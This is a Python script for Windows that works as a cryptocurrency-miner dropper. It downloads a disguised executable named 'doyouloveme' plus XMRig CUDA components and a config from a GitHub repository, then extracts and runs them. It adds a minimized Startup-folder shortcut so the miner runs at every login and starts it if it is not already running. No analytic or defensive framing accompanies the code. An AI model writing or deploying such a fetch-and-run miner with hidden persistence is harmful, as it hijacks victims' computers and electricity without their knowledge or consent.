try:
    import os, win32com.client, wmi, urllib.request, subprocess, sys, zipfile, time
except ImportError:
    pyd = str(sys.executable)
    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/requirements.txt")
    
if(os.name != "nt"):
	os._exit(1)

computer = wmi.WMI()

rawrepo = "https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli"

 
def programcheck(process_name):
    call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
    output = subprocess.check_output(call).decode()
    last_line = output.strip().split('\r\n')[-1]
    return last_line.lower().startswith(process_name.lower())
   
 
def xm():
   xmpath = "C:/Users/Public/Documents/spx"
   startupath = os.path.expanduser('~') + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
   try:
      gpu = computer.Win32_VideoController()[1]
   except:
      gpu = computer.Win32_VideoController()[0]
      
   if not os.path.exists(xmpath):
      os.makedirs(xmpath)
      
   if not os.path.exists(xmpath + 'doyouloveme.exe'):
      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/doyouloveme.zip", "{}/doyouloveme.zip".format(xmpath))
      with zipfile.ZipFile("{}/doyouloveme.zip".format(xmpath), 'r') as zip_ref:
         zip_ref.extractall(xmpath)
      time.sleep(3)
      os.remove("{}/doyouloveme.zip".format(xmpath))
      
   if not os.path.exists(xmpath + '/config.json'):
      urllib.request.urlretrieve(rawrepo + '/main/config.json', '{}/config.json'.format(xmpath))

   if(gpu.AdapterCompatibility == "NVIDIA"):
      if not os.path.exists(xmpath + '/config.json'):
         urllib.request.urlretrieve(rawrepo + '/main/cuda/config.json', '{}/config.json'.format(xmpath))
         
      if not os.path.exists(xmpath + 'xmrig-cuda.dll'):
         urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/cuda.zip", "{}/cuda.zip".format(xmpath))
         with zipfile.ZipFile("{}/cuda.zip".format(xmpath), 'r') as zip_ref:
            zip_ref.extractall(xmpath)
         time.sleep(3)
         os.remove("{}/cuda.zip".format(xmpath))
      
   if not os.path.exists(startupath + 'doyouloveme.lnk'):
      path = os.path.join(startupath, 'doyouloveme.lnk')
      target = '{}/doyouloveme.exe'.format(xmpath)
      icon = '{}/ico.ico'.format(xmpath)
      shell = win32com.client.Dispatch("WScript.Shell")
      shortcut = shell.CreateShortCut(path)
      shortcut.Targetpath = target
      shortcut.IconLocation = icon
      shortcut.WindowStyle = 7
      shortcut.save()         
      
   if(programcheck("doyouloveme.exe") == False):
      os.system('{}/doyouloveme.exe'.format(xmpath))
      os._exit(1)

xm()
#:) yeah i love you but you love me ?